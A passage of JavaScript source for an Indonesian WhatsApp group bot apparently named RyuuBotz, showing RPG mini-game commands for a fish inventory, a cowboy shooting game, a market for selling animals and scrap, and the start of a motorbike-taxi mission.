┊ *💌 Name :* ${user.registered ? user.name : RyuuBotz.getName(m.sender)}
┊ *📊 Level :* ${user.level}
┊ *✨ Exp :* ${user.exp}
╰═┅═━––––––─ׄ✧

╭━━━━「 *ISI* 」
┊🦀 Kepiting: ${user.kepiting}
┊🦞 Lobster: ${user.lobster}
┊🦐 Udang: ${user.udang}
┊🦑 Cumi: ${user.cumi}
┊🐙 Gurita: ${user.gurita}
┊🐡 Buntal: ${user.buntal}
┊🐠 Dory: ${user.dory}
┊🐳 Orca: ${user.orca}
┊🐬 Lumba: ${user.lumba}
┊🐋 Paus: ${user.paus}
┊🦈 Hiu: ${user.hiu}
╰═┅═━––––––─ׄ✧
🎏 Total Isi: *${user.kepiting + user.lobster + user.udang + user.cumi + user.gurita + user.buntal + user.dory + user.orca + user.lumba + user.paus + user.hiu}* Jenis`
  reply(past)
  }
break
//==================================================================
case 'koboy': {
  if (!m.isGroup) return reply(mess.only.group)
function random(arr) {
  return arr[Math.floor(Math.random() * arr.length)]
}
	try {
  RyuuBotz.tembak = RyuuBotz.tembak || { musuh: [], tembak: [] }
   if(/kiri/i.test(text)) {

    let kiri = [
      ["🤠", "-", "-", "-", "-"],
      ["-", "🤠", "-", "-", "-"],
      ["-", "-", "🤠", "-", "-"],
      ["-", "-", "-", "🤠", "-"],
      ["-", "-", "-", "-", "🤠"]
    ]

    if(RyuuBotz.tembak.tembak.indexOf("🤠") == 0) {
      RyuuBotz.tembak.tembak = kiri[0]
    } else if(RyuuBotz.tembak.tembak.indexOf("🤠") == 1) {
      RyuuBotz.tembak.tembak = kiri[0]
    } else if(RyuuBotz.tembak.tembak.indexOf("🤠") == 2) {
      RyuuBotz.tembak.tembak = kiri[1]
    } else if(RyuuBotz.tembak.tembak.indexOf("🤠") == 3) {
      RyuuBotz.tembak.tembak = kiri[2]
    } else if(RyuuBotz.tembak.tembak.indexOf("🤠") == 4) {
      RyuuBotz.tembak.tembak = kiri[3]
    }

    let pos = RyuuBotz.tembak.musuh.join(" ") + "\n\n\n" + RyuuBotz.tembak.tembak.join(" ")



    if(RyuuBotz.tembak.musuh.indexOf("🥷") === RyuuBotz.tembak.tembak.indexOf("🤠")) return RyuuBotz.sendButton(m.chat, pos, wm, [
                                                                                              ['Tembak', `${command}koboy tembak`]             
                                                                                              ])
    return RyuuBotz.sendButton(m.chat, pos, wm, [
          ['←', `${command}koboy kiri`], ['→', `${command}koboy kanan`]
])
  } else if(/kanan/i.test(text)) {

    let kanan = [
      ["🤠", "-", "-", "-", "-"],
      ["-", "🤠", "-", "-", "-"],
      ["-", "-", "🤠", "-", "-"],
      ["-", "-", "-", "🤠", "-"],
      ["-", "-", "-", "-", "🤠"]
    ]

    if(RyuuBotz.tembak.tembak.indexOf("🤠") == 0) {
      RyuuBotz.tembak.tembak = kanan[1]
    } else if(RyuuBotz.tembak.tembak.indexOf("🤠") == 1) {
      RyuuBotz.tembak.tembak = kanan[2]
    } else if(RyuuBotz.tembak.tembak.indexOf("🤠") == 2) {
      RyuuBotz.tembak.tembak = kanan[3]
    } else if(RyuuBotz.tembak.tembak.indexOf("🤠") == 3) {
      RyuuBotz.tembak.tembak = kanan[4]
    } else if(RyuuBotz.tembak.tembak.indexOf("🤠") == 4) {
      RyuuBotz.tembak.tembak = kanan[4]
    }

    let pos = RyuuBotz.tembak.musuh.join(" ") + "\n\n\n" + RyuuBotz.tembak.tembak.join(" ")



    if(RyuuBotz.tembak.musuh.indexOf("🥷") === RyuuBotz.tembak.tembak.indexOf("🤠")) return RyuuBotz.sendButton(m.chat, pos, wm, [
                                                                                              ['Tembak', `${command}koboy tembak`]             
                                                                                              ])             
    return RyuuBotz.sendButton(m.chat, pos, wm, [
          ['←', `${command}koboy kiri`], ['→', `${command}koboy kanan`]
])
  } else if(/tembak/i.test(text)) {

    if(RyuuBotz.tembak.tembak.indexOf("🤠") == RyuuBotz.tembak.musuh.indexOf("🥷")) {
      RyuuBotz.tembak = {}
      global.db.users[m.sender].money += 1000
      reply("Kamu menang!\n\nUang += 1000")
    }

  } else {
   let randMusuh = [
      ["🥷", "-", "-", "-", "-"],
      ["-", "🥷", "-", "-", "-"],
      ["-", "-", "🥷", "-", "-"],
      ["-", "-", "-", "🥷", "-"],
      ["-", "-", "-", "-", "🥷"]
    ]
   let randAku = [
      ["🤠", "-", "-", "-", "-"],
      ["-", "🤠", "-", "-", "-"],
      ["-", "-", "🤠", "-", "-"],
      ["-", "-", "-", "🤠", "-"],
      ["-", "-", "-", "-", "🤠"]
    ]

    let musuh = random(randMusuh)
   let aku = random(randAku)

    RyuuBotz.tembak.musuh = musuh
    RyuuBotz.tembak.tembak = aku

    let pos = RyuuBotz.tembak.musuh.join(" ") + "\n\n\n" + RyuuBotz.tembak.tembak.join(" ")

    if(RyuuBotz.tembak.musuh.indexOf("🥷") === RyuuBotz.tembak.tembak.indexOf("🤠")) return RyuuBotz.sendButton(m.chat, pos, wm, [
                                                                                              ['Tembak', `${command}koboy tembak`]             
                                                                                              ])
    return RyuuBotz.sendButton(m.chat, pos, wm, [
          ['←', `${command}koboy kiri`], ['→', `${command}koboy kanan`]
])
  }
  } catch (e) {
  	throw false
  }
}
break
//==================================================================
case 'pasar': {
  if (!m.isGroup) return reply(mess.only.group)
const Skepiting = 7000
const Slobster = 7000
const Sudang = 7000
const Scumi = 7000
const Sgurita = 7000
const Sbuntal = 7000
const Sdory = 7000
const Sorca = 7000
const Slumba = 7000
const Spaus = 7000
const Sikan = 7000
const Shiu = 7000
const Sbanteng = 9000
const Sharimau = 9000
const Sgajah = 9000
const Skambing = 9000
const Spanda = 9000
const Sbuaya = 9000
const Skerbau = 9000
const Ssapi= 9000
const Smonyet = 9000
const Sbabihutan = 9000
const Sbabi = 9000
const Sayam = 9000
const Sbotol = 100
const Skardus = 100
const Skaleng = 100
const Sgelas = 100
const Splastik = 100

    const _armor = global.db.users[m.sender].armor
    const armor = (_armor == 0 ? 20000 : '' || _armor == 1 ? 49999 : '' || _armor == 2 ? 99999 : '' || _armor == 3 ? 149999 : '' || _armor == 4 ? 299999 : '')
    let type = (args[0] || '').toLowerCase()
    let _type = (args[1] || '').toLowerCase()
    let jualbeli = (args[0] || '').toLowerCase()
    const Kchat = `╍╌╌╍╌╌╍╌╌╍╌╌┅═━––––––๑
*🛒 Hewan Laut   | 💲 Harga Jual*\n═┅═━––––––━––––––๑
🦀 Kepiting: ${Skepiting}
🦞 Lobster: ${Slobster}
🦐 Udang: ${Sudang}
🦑 Cumi: ${Scumi}
🐙 Gurita: ${Sgurita}
🐡 Buntal: ${Sbuntal}
🐠 Dory: ${Sdory}
🐳 Orca: ${Sorca}
🐬 Lumba: ${Slumba}
🐋 Paus: ${Spaus}
🦈 Hiu: ${Shiu}
╍╌╌╍╌╌╍╌╌╍╌╌┅═━––––––๑
*🛒 Hewan Darat   | 💲 Harga Jual*\n═┅═━––––––━––––––๑
🐃 Banteng: ${Sbanteng}
🐅 Harimau: ${Sharimau}
🐘 Gajah: ${Sgajah}
🐐 Kambing: ${Skambing}
🐼 Panda: ${Spanda}
🐃 Kerbau: ${Skerbau}
🐊 Buaya: ${Sbuaya}
🐂 Sapi: ${Ssapi}
🐒 Monyet: ${Smonyet}
🐗 Babi Hutan: ${Sbabihutan}
🐖 Babi: ${Sbabi}
🐔 Ayam: ${Sayam}
╍╌╌╍╌╌╍╌╌╍╌╌┅═━––––––๑
📌 *Contoh penggunaan :*\n═┅═━––––––━––––––๑
#pasar jual ayam [Jumlah]
`.trim()
    try {
        if (/pasar|toko/i.test(command)) {
            const count = args[2] && args[2].length > 0 ? Math.min(99999999, Math.max(parseInt(args[2]), 1)) : !args[2] || args.length < 4 ? 1 :Math.min(1, count)
            const sampah = global.db.users[m.sender].sampah
            switch (jualbeli) {

            case 'jual': 
                switch (_type) {                  
                     case 'banteng':
                        if (global.db.users[m.sender].banteng >= count * 1) {
                            global.db.users[m.sender].money += Spaus * count
                            global.db.users[m.sender].banteng -= count * 1
                            reply( `Sukses Menjual ${count} Banteng Dengan Harga ${Sbanteng * count} Money `.trim())
                        } else reply( `Banteng Kamu Tidak Cukup`.trim())
                        break
                        case 'harimau':
                        if (global.db.users[m.sender].harimau >= count * 1) {
                            global.db.users[m.sender].money += Sharimau * count
                            global.db.users[m.sender].harimau -= count * 1
                            reply( `Sukses Menjual ${count} Harimau Dengan Harga ${Sharimau * count} Money `.trim())
                        } else reply( `Harimau Kamu Tidak Cukup`.trim())
                        break
                        case 'gajah':
                        if (global.db.users[m.sender].gajah >= count * 1) {
                            global.db.users[m.sender].money += Sgajah * count
                            global.db.users[m.sender].gajah -= count * 1
                            reply( `Sukses Menjual ${count} Gajah Dengan Harga ${Sgajah * count} Money `.trim())
                        } else reply( `Gajah Kamu Tidak Cukup`.trim())
                        break
                        case 'kambing':
                        if (global.db.users[m.sender].kambing >= count * 1) {
                            global.db.users[m.sender].money += Skambing * count
                            global.db.users[m.sender].kambing -= count * 1
                            reply( `Sukses Menjual ${count} Kambing Dengan Harga ${Skambing * count} Money `.trim())
                        } else reply( `Kambing Kamu Tidak Cukup`.trim())
                        break
                        case 'panda':
                        if (global.db.users[m.sender].panda >= count * 1) {
                            global.db.users[m.sender].money += Spanda * count
                            global.db.users[m.sender].panda -= count * 1
                            reply( `Sukses Menjual ${count} Panda Dengan Harga ${Sbuaya * count} Money `.trim())
                        } else reply( `Panda Kamu Tidak Cukup`.trim())
                        break
                        case 'buaya':
                        if (global.db.users[m.sender].buaya >= count * 1) {
                            global.db.users[m.sender].money += Sbuaya * count
                            global.db.users[m.sender].buaya -= count * 1
                            reply( `Sukses Menjual ${count} Buaya Dengan Harga ${Sbuaya * count} Money `.trim())
                        } else reply( `Buaya Kamu Tidak Cukup`.trim())
                        break
                        case 'kerbau':
                        if (global.db.users[m.sender].kerbau >= count * 1) {
                            global.db.users[m.sender].money += Skerbau * count
                            global.db.users[m.sender].kerbau -= count * 1
                            reply( `Sukses Menjual ${count} Kerbau Dengan Harga ${Skerbau * count} Money `.trim())
                        } else reply( `Kerbau Kamu Tidak Cukup`.trim())
                        break
                        case 'sapi':
                        if (global.db.users[m.sender].sapi >= count * 1) {
                            global.db.users[m.sender].money += Ssapi * count
                            global.db.users[m.sender].sapi -= count * 1
                            reply( `Sukses Menjual ${count} Sapi Dengan Harga ${Ssapi * count} Money `.trim())
                        } else reply( `Sapi Kamu Tidak Cukup`.trim())
                        break
                        case 'monyet':
                        if (global.db.users[m.sender].monyet >= count * 1) {
                            global.db.users[m.sender].money += Smonyet * count
                            global.db.users[m.sender].monyet -= count * 1
                            reply( `Sukses Menjual ${count} Monyet Dengan Harga ${Smonyet * count} Money `.trim())
                        } else reply( `Monyet Kamu Tidak Cukup`.trim())
                        break
                        case 'babi':
                        if (global.db.users[m.sender].babi >= count * 1) {
                            global.db.users[m.sender].money += Skepiting * count
                            global.db.users[m.sender].babi -= count * 1
                            reply( `Sukses Menjual ${count} Babi Dengan Harga ${Sbabi * count} Money `.trim())
                        } else reply( `Babi Kamu Tidak Cukup`.trim())
                        break
                        case 'babihutan':
                        if (global.db.users[m.sender].babihutan >= count * 1) {
                            global.db.users[m.sender].money += Sbabihutan * count
                            global.db.users[m.sender].babihutan -= count * 1
                            reply( `Sukses Menjual ${count} Babi Hutan Dengan Harga ${Sbabihutan * count} Money `.trim())
                        } else reply( `Babi Hutan Kamu Tidak Cukup`.trim())
                        break
                        case 'ayam':
                        if (global.db.users[m.sender].ayam >= count * 1) {
                            global.db.users[m.sender].money += Sayam * count
                            global.db.users[m.sender].ayam -= count * 1
                            reply( `Sukses Menjual ${count} Ayam Dengan Harga ${Sayam * count} Money `.trim())
                        } else reply( `Ayam Kamu Tidak Cukup`.trim())
                        break
                        //mancing
                        case 'kepiting':
                        if (global.db.users[m.sender].kepiting >= count * 1) {
                            global.db.users[m.sender].money += Skepiting * count
                            global.db.users[m.sender].kepiting -= count * 1
                            reply( `Sukses Menjual ${count} Kepiting Dengan Harga ${Skepiting * count} Money `.trim())
                        } else reply( `Kepiting Kamu Tidak Cukup`.trim())
                        break
                        case 'ikan':
                        if (global.db.users[m.sender].ikan >= count * 1) {
                            global.db.users[m.sender].money += Skepiting * count
                            global.db.users[m.sender].ikan -= count * 1
                            reply( `Sukses Menjual ${count} Ikan Dengan Harga ${Sikan * count} Money `.trim())
                        } else reply( `Ikan Kamu Tidak Cukup`.trim())
                        break
                        case 'dory':
                        if (global.db.users[m.sender].dory >= count * 1) {
                            global.db.users[m.sender].money += Sdory * count
                            global.db.users[m.sender].dory -= count * 1
                            reply( `Sukses Menjual ${count} Ikan Dory Dengan Harga ${Sdory * count} Money `.trim())
                        } else reply( `Ikan Dory Kamu Tidak Cukup`.trim())
                        break
                        case 'gurita':
                        if (global.db.users[m.sender].gurita >= count * 1) {
                            global.db.users[m.sender].money += Skepiting * count
                            global.db.users[m.sender].gurita -= count * 1
                            reply( `Sukses Menjual ${count} Gurita Dengan Harga ${Sgurita * count} Money `.trim())
                        } else reply( `Gurita Kamu Tidak Cukup`.trim())
                        break
                        case 'buntal':
                        if (global.db.users[m.sender].buntal >= count * 1) {
                            global.db.users[m.sender].money += Sbuntal * count
                            global.db.users[m.sender].buntal -= count * 1
                            reply( `Sukses Menjual ${count} Ikan Buntal Dengan Harga ${Sbuntal * count} Money `.trim())
                        } else reply( `Ikan Buntal Kamu Tidak Cukup`.trim())
                        break
                        case 'hiu':
                        if (global.db.users[m.sender].hiu >= count * 1) {
                            global.db.users[m.sender].money += Shiu * count
                            global.db.users[m.sender].hiu -= count * 1
                            reply( `Sukses Menjual ${count} Hiu Dengan Harga ${Shiu * count} Money `.trim())
                        } else reply( `Hiu Kamu Tidak Cukup`.trim())
                        break
                        case 'orca':
                        if (global.db.users[m.sender].orca >= count * 1) {
                            global.db.users[m.sender].money += Sorca * count
                            global.db.users[m.sender].orca -= count * 1
                            reply( `Sukses Menjual ${count} Paus Orca Dengan Harga ${Sorca * count} Money `.trim())
                        } else reply( `Paus Orca Kamu Tidak Cukup`.trim())
                        break
                        case 'lumba':
                        if (global.db.users[m.sender].lumba >= count * 1) {
                            global.db.users[m.sender].money += Skepiting * count
                            global.db.users[m.sender].lumba -= count * 1
                            reply( `Sukses Menjual ${count} Lumba Lumba Dengan Harga ${Slumba * count} Money `.trim())
                        } else reply( `Lumba Lumba Kamu Tidak Cukup`.trim())
                        break
                        case 'paus':
                        if (global.db.users[m.sender].paus >= count * 1) {
                            global.db.users[m.sender].money += Spaus * count
                            global.db.users[m.sender].paus -= count * 1
                            reply( `Sukses Menjual ${count} Paus Dengan Harga ${Spaus * count} Money `.trim())
                        } else reply( `Paus Kamu Tidak Cukup`.trim())
                        break
                  case 'lobster':
                        if (global.db.users[m.sender].lobster >= count * 1) {
                            global.db.users[m.sender].money += Slobster * count
                            global.db.users[m.sender].lobster -= count * 1
                            reply( `Sukses Menjual ${count} Lobster Dengan Harga ${Slobster * count} Money `.trim())
                        } else reply( `Lobster Kamu Tidak Cukup`.trim())
                        break
                     case 'udang':
                        if (global.db.users[m.sender].udang >= count * 1) {
                            global.db.users[m.sender].money += Sudang * count
                            global.db.users[m.sender].udang -= count * 1
                            reply( `Sukses Menjual ${count} Udang Dengan Harga ${Sudang * count} Money `.trim())
                        } else reply( `Udang Kamu Tidak Cukup`.trim())
                        break
                      case 'cumi':
                        if (global.db.users[m.sender].cumi >= count * 1) {
                            global.db.users[m.sender].money += Scumi * count
                            global.db.users[m.sender].cumi -= count * 1
                            reply( `Sukses Menjual ${count} Cumi Dengan Harga ${Scumi * count} Money `.trim())
                        } else reply( `Cumi Kamu Tidak Cukup`.trim())
                         break
                        case 'botol':
                        if (global.db.users[m.sender].botol >= count * 1) {
                            global.db.users[m.sender].money += Sbotol * count
                            global.db.users[m.sender].botol -= count * 1
                            reply( `Sukses Menjual ${count} Cumi Dengan Harga ${Sbotol * count} Money `.trim())
                        } else reply( `Botol Kamu Tidak Cukup`.trim())
                        break
                        case 'kaleng':
                        if (global.db.users[m.sender].kaleng >= count * 1) {
                            global.db.users[m.sender].money += Skaleng * count
                            global.db.users[m.sender].kaleng -= count * 1
                            reply( `Sukses Menjual ${count} Kaleng Dengan Harga ${Skaleng * count} Money `.trim())
                        } else reply( `Kaleng Kamu Tidak Cukup`.trim())
                        break
                        case 'kardus':
                        if (global.db.users[m.sender].kardus >= count * 1) {
                            global.db.users[m.sender].money += Skardus * count
                            global.db.users[m.sender].kardus -= count * 1
                            reply( `Sukses Menjual ${count} Kardus Dengan Harga ${Skardus * count} Money `.trim())
                        } else reply( `Kardus Kamu Tidak Cukup`.trim())
                        break
                        case 'gelas':
                        if (global.db.users[m.sender].gelas >= count * 1) {
                            global.db.users[m.sender].money += Sgelas * count
                            global.db.users[m.sender].gelas -= count * 1
                            reply( `Sukses Menjual ${count} Gelas Dengan Harga ${Sgelas * count} Money `.trim())
                        } else reply( `Gelas Kamu Tidak Cukup`.trim())
                        break
                        case 'plastik':
                        if (global.db.users[m.sender].plastik >= count * 1) {
                            global.db.users[m.sender].money += Splastik * count
                            global.db.users[m.sender].plastik -= count * 1
                            reply( `Sukses Menjual ${count} Plastik Dengan Harga ${Splastik * count} Money `.trim())
                        } else reply( `Plastik Kamu Tidak Cukup`.trim())
                        break
                    default:
                        return reply(Kchat)
                }
                break
            default:
                return reply(Kchat)
            }

        } else if (/sell|jual|/i.test(command)) {
            const count = args[1] && args[1].length > 0 ? Math.min(99999999, Math.max(parseInt(args[1]), 1)) : !args[1] || args.length < 3 ? 1 : Math.min(1, count)
            switch (type) { 
                       case 'banteng':
                        if (global.db.users[m.sender].banteng >= count * 1) {
                            global.db.users[m.sender].money += Spaus * count
                            global.db.users[m.sender].banteng -= count * 1
                            reply( `Sukses Menjual ${count} Banteng Dengan Harga ${Sbanteng * count} Money `.trim())
                        } else reply( `Banteng Kamu Tidak Cukup`.trim())
                        break
                        case 'harimau':
                        if (global.db.users[m.sender].harimau >= count * 1) {
                            global.db.users[m.sender].money += Sharimau * count
                            global.db.users[m.sender].harimau -= count * 1
                            reply( `Sukses Menjual ${count} Harimau Dengan Harga ${Sharimau * count} Money `.trim())
                        } else reply( `Harimau Kamu Tidak Cukup`.trim())
                        break
                        case 'gajah':
                        if (global.db.users[m.sender].gajah >= count * 1) {
                            global.db.users[m.sender].money += Sgajah * count
                            global.db.users[m.sender].gajah -= count * 1
                            reply( `Sukses Menjual ${count} Gajah Dengan Harga ${Sgajah * count} Money `.trim())
                        } else reply( `Gajah Kamu Tidak Cukup`.trim())
                        break
                        case 'kambing':
                        if (global.db.users[m.sender].kambing >= count * 1) {
                            global.db.users[m.sender].money += Skambing * count
                            global.db.users[m.sender].kambing -= count * 1
                            reply( `Sukses Menjual ${count} Kambing Dengan Harga ${Skambing * count} Money `.trim())
                        } else reply( `Kambing Kamu Tidak Cukup`.trim())
                        break
                        case 'panda':
                        if (global.db.users[m.sender].panda >= count * 1) {
                            global.db.users[m.sender].money += Spanda * count
                            global.db.users[m.sender].panda -= count * 1
                            reply( `Sukses Menjual ${count} Panda Dengan Harga ${Sbuaya * count} Money `.trim())
                        } else reply( `Panda Kamu Tidak Cukup`.trim())
                        break
                        case 'buaya':
                        if (global.db.users[m.sender].buaya >= count * 1) {
                            global.db.users[m.sender].money += Sbuaya * count
                            global.db.users[m.sender].buaya -= count * 1
                            reply( `Sukses Menjual ${count} Buaya Dengan Harga ${Sbuaya * count} Money `.trim())
                        } else reply( `Buaya Kamu Tidak Cukup`.trim())
                        break
                        case 'kerbau':
                        if (global.db.users[m.sender].kerbau >= count * 1) {
                            global.db.users[m.sender].money += Skerbau * count
                            global.db.users[m.sender].kerbau -= count * 1
                            reply( `Sukses Menjual ${count} Kerbau Dengan Harga ${Skerbau * count} Money `.trim())
                        } else reply( `Kerbau Kamu Tidak Cukup`.trim())
                        break
                        case 'sapi':
                        if (global.db.users[m.sender].sapi >= count * 1) {
                            global.db.users[m.sender].money += Ssapi * count
                            global.db.users[m.sender].sapi -= count * 1
                            reply( `Sukses Menjual ${count} Sapi Dengan Harga ${Ssapi * count} Money `.trim())
                        } else reply( `Sapi Kamu Tidak Cukup`.trim())
                        break
                        case 'monyet':
                        if (global.db.users[m.sender].monyet >= count * 1) {
                            global.db.users[m.sender].money += Smonyet * count
                            global.db.users[m.sender].monyet -= count * 1
                            reply( `Sukses Menjual ${count} Monyet Dengan Harga ${Smonyet * count} Money `.trim())
                        } else reply( `Monyet Kamu Tidak Cukup`.trim())
                        break
                        case 'babi':
                        if (global.db.users[m.sender].babi >= count * 1) {
                            global.db.users[m.sender].money += Sbabi * count
                            global.db.users[m.sender].babi -= count * 1
                            reply( `Sukses Menjual ${count} Babi Dengan Harga ${Sbabi * count} Money `.trim())
                        } else reply( `Babi Kamu Tidak Cukup`.trim())
                        break
                        case 'babihutan':
                        if (global.db.users[m.sender].babihutan >= count * 1) {
                            global.db.users[m.sender].money += Sbabihutan * count
                            global.db.users[m.sender].babihutan -= count * 1
                            reply( `Sukses Menjual ${count} Babi Hutan Dengan Harga ${Sbabihutan * count} Money `.trim())
                        } else reply( `Babi Hutan Kamu Tidak Cukup`.trim())
                        break
                        case 'ayam':
                        if (global.db.users[m.sender].ayam >= count * 1) {
                            global.db.users[m.sender].money += Sayam * count
                            global.db.users[m.sender].ayam -= count * 1
                            reply( `Sukses Menjual ${count} Ayam Dengan Harga ${Sayam * count} Money `.trim())
                        } else reply( `Ayam Kamu Tidak Cukup`.trim())
                        break
                        //mancing
                        case 'kepiting':
                        if (global.db.users[m.sender].kepiting >= count * 1) {
                            global.db.users[m.sender].money += Skepiting * count
                            global.db.users[m.sender].kepiting -= count * 1
                            reply( `Sukses Menjual ${count} Kepiting Dengan Harga ${Skepiting * count} Money `.trim())
                        } else reply( `Kepiting Kamu Tidak Cukup`.trim())
                        break
                        case 'ikan':
                        if (global.db.users[m.sender].ikan >= count * 1) {
                            global.db.users[m.sender].money += Skepiting * count
                            global.db.users[m.sender].ikan -= count * 1
                            reply( `Sukses Menjual ${count} Ikan Dengan Harga ${Sikan * count} Money `.trim())
                        } else reply( `Ikan Kamu Tidak Cukup`.trim())
                        break
                        case 'dory':
                        if (global.db.users[m.sender].dory >= count * 1) {
                            global.db.users[m.sender].money += Sdory * count
                            global.db.users[m.sender].dory -= count * 1
                            reply( `Sukses Menjual ${count} Ikan Dory Dengan Harga ${Sdory * count} Money `.trim())
                        } else reply( `Ikan Dory Kamu Tidak Cukup`.trim())
                        break
                        case 'gurita':
                        if (global.db.users[m.sender].gurita >= count * 1) {
                            global.db.users[m.sender].money += Skepiting * count
                            global.db.users[m.sender].gurita -= count * 1
                            reply( `Sukses Menjual ${count} Gurita Dengan Harga ${Sgurita * count} Money `.trim())
                        } else reply( `Gurita Kamu Tidak Cukup`.trim())
                        break
                        case 'buntal':
                        if (global.db.users[m.sender].buntal >= count * 1) {
                            global.db.users[m.sender].money += Sbuntal * count
                            global.db.users[m.sender].buntal -= count * 1
                            reply( `Sukses Menjual ${count} Ikan Buntal Dengan Harga ${Sbuntal * count} Money `.trim())
                        } else reply( `Ikan Buntal Kamu Tidak Cukup`.trim())
                        break
                        case 'hiu':
                        if (global.db.users[m.sender].hiu >= count * 1) {
                            global.db.users[m.sender].money += Shiu * count
                            global.db.users[m.sender].hiu -= count * 1
                            reply( `Sukses Menjual ${count} Hiu Dengan Harga ${Shiu * count} Money `.trim())
                        } else reply( `Hiu Kamu Tidak Cukup`.trim())
                        break
                        case 'orca':
                        if (global.db.users[m.sender].orca >= count * 1) {
                            global.db.users[m.sender].money += Sorca * count
                            global.db.users[m.sender].orca -= count * 1
                            reply( `Sukses Menjual ${count} Paus Orca Dengan Harga ${Sorca * count} Money `.trim())
                        } else reply( `Paus Orca Kamu Tidak Cukup`.trim())
                        break
                        case 'lumba':
                        if (global.db.users[m.sender].lumba >= count * 1) {
                            global.db.users[m.sender].money += Skepiting * count
                            global.db.users[m.sender].lumba -= count * 1
                            reply( `Sukses Menjual ${count} Lumba Lumba Dengan Harga ${Slumba * count} Money `.trim())
                        } else reply( `Lumba Lumba Kamu Tidak Cukup`.trim())
                        break
                        case 'paus':
                        if (global.db.users[m.sender].paus >= count * 1) {
                            global.db.users[m.sender].money += Spaus * count
                            global.db.users[m.sender].paus -= count * 1
                            reply( `Sukses Menjual ${count} Paus Dengan Harga ${Spaus * count} Money `.trim())
                        } else reply( `Paus Kamu Tidak Cukup`.trim())
                        break
                  case 'lobster':
                        if (global.db.users[m.sender].lobster >= count * 1) {
                            global.db.users[m.sender].money += Slobster * count
                            global.db.users[m.sender].lobster -= count * 1
                            reply( `Sukses Menjual ${count} Lobster Dengan Harga ${Slobster * count} Money `.trim())
                        } else reply( `Lobster Kamu Tidak Cukup`.trim())
                        break
                     case 'udang':
                        if (global.db.users[m.sender].udang >= count * 1) {
                            global.db.users[m.sender].money += Sudang * count
                            global.db.users[m.sender].udang -= count * 1
                            reply( `Sukses Menjual ${count} Udang Dengan Harga ${Sudang * count} Money `.trim())
                        } else reply( `Udang Kamu Tidak Cukup`.trim())
                        break
                      case 'cumi':
                        if (global.db.users[m.sender].cumi >= count * 1) {
                            global.db.users[m.sender].money += Scumi * count
                            global.db.users[m.sender].cumi -= count * 1
                            reply( `Sukses Menjual ${count} Cumi Dengan Harga ${Scumi * count} Money `.trim())
                        } else reply( `Cumi Kamu Tidak Cukup`.trim())
                         break
                        case 'botol':
                        if (global.db.users[m.sender].botol >= count * 1) {
                            global.db.users[m.sender].money += Sbotol * count
                            global.db.users[m.sender].botol -= count * 1
                            reply( `Sukses Menjual ${count} Botol Dengan Harga ${Sbotol * count} Money `.trim())
                        } else reply( `Botol Kamu Tidak Cukup`.trim())
                        break         
                        case 'kaleng':
                        if (global.db.users[m.sender].kaleng >= count * 1) {
                            global.db.users[m.sender].money += Skaleng * count
                            global.db.users[m.sender].kaleng -= count * 1
                            reply( `Sukses Menjual ${count} Kaleng Dengan Harga ${Skaleng * count} Money `.trim())
                        } else reply( `Kaleng Kamu Tidak Cukup`.trim())
                        break        
                        case 'kardus':
                        if (global.db.users[m.sender].kardus >= count * 1) {
                            global.db.users[m.sender].money += Skardus * count
                            global.db.users[m.sender].kardus -= count * 1
                            reply( `Sukses Menjual ${count} Kardus Dengan Harga ${Skardus * count} Money `.trim())
                        } else reply( `Kardus Kamu Tidak Cukup`.trim())
                        break
                         case 'gelas':
                        if (global.db.users[m.sender].gelas >= count * 1) {
                            global.db.users[m.sender].money += Sgelas * count
                            global.db.users[m.sender].gelas -= count * 1
                            reply( `Sukses Menjual ${count} Gelas Dengan Harga ${Sgelas * count} Money `.trim())
                        } else reply( `Gelas Kamu Tidak Cukup`.trim())
                        break
                        case 'plastik':
                        if (global.db.users[m.sender].plastik >= count * 1) {
                            global.db.users[m.sender].money += Splastik * count
                            global.db.users[m.sender].plastik -= count * 1
                            reply( `Sukses Menjual ${count} Plastik Dengan Harga ${Splastik * count} Money `.trim())
                        } else reply( `Plastik Kamu Tidak Cukup`.trim())
                        break       
                default:
                    return reply(Kchat)
            }
        }
} catch (err) {
console.log(util.format(err))
let e = String(err)
}
}
break
//==================================================================
case 'ojek': {
  if (!m.isGroup) return reply(mess.only.group)
function clockString(ms) {
    let h = Math.floor(ms / 3600000)
    let m = Math.floor(ms / 60000) % 60
    let s = Math.floor(ms / 1000) % 60
    return [h, m, s].map(v => v.toString().padStart(2, 0)).join(':')
}
    let __timers = (new Date - global.db.users[m.sender].lastmisi)
    let _timers = (3600000 - __timers)
    let order = global.db.users[m.sender].ojekk
    let timers = clockString(_timers)
    let name = RyuuBotz.getName(m.sender)
    let user = global.db.users[m.sender]
    let id = m.sender
    let kerja = 'Ojek'
    RyuuBotz.misi = RyuuBotz.misi ? RyuuBotz.misi: {}
    if (id in RyuuBotz.misi) {
        reply( `Selesaikan Misi ${RyuuBotz.misi[id][0]} Terlebih Dahulu`)
        throw false
    }
    if (new Date - global.db.users[m.sender].lastmisi > 3600000) {
        let randomaku4 = Math.floor(Math.random() * 10)
        let randomaku5 = Math.floor(Math.random() * 10)

        let rbrb4 = (randomaku4 * 100000)
        let rbrb5 = (randomaku5 * 1000)

        var dimas = `
🚶⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬜⬛⬜⬜⬜⬛⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
🏘️🏘️🏘️🏘️🌳  🌳 🏘️       🛵
✔️ Mendapatkan orderan....
`.trim()

        var dimas2 = `
🚶🛵⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬜⬛⬜⬜⬜⬛⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
🏘️🏘️🏘️🏘️🌳  🌳 🏘️
➕ Mengantar ke tujuan....
`.trim()

        var dimas3 = `
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬛⬛⬜⬜⬜⬛⬛
⬛⬛⬛⬛⬛⬛⬛🛵⬛⬛
🏘️🏘️🏘️🏘️🌳  🌳 🏘️
➕ Sampai di tujuan....
`.trim()

        var dimas4 = `
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬛⬛⬜⬜⬜⬛⬛
⬛⬛⬛⬛⬛⬛⬛🛵⬛⬛
🏘️🏘️🏘️🏘️🌳  🌳 🏘️ 🚶
➕ 💹Menerima gaji....
`.trim()

        var hsl = `
*—[ Hasil Ngojek ${name} ]—*
➕ 💹 Uang = [ ${rbrb4} ]
➕ ✨ Exp = [ ${rbrb5} ]
➕ 😍 Order Selesai = +1
➕ 📥Total Order Sebelumnya : ${order}
`.trim()
        
        user.money += rbrb4
        user.exp += rbrb5
        user.ojekk += 1

